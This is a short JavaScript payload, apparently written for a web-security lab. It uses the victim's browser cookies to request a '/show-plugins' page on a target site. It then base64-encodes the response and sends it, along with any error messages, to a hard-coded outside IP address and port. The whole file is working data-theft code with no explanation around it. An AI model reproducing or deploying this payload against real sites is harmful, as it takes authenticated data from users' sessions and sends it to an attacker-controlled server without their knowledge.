const url4 = 'http://website-p3h2v8.inst.malicecyber.com/show-plugins';

// Making a GET request using fetch()
fetch(url4, {
  credentials: 'include'  
})
  .then(response => {
    return response.json();
  })
  .then(data => {
    console.log("Here is the data");
    console.log(data);
    fetch("http://82.65.210.151:24000/?encodedData=" + btoa(data));
  })
  .catch(error => {
    console.log("error");
    fetch("http://82.65.210.151:24000/?error" + error);
  });
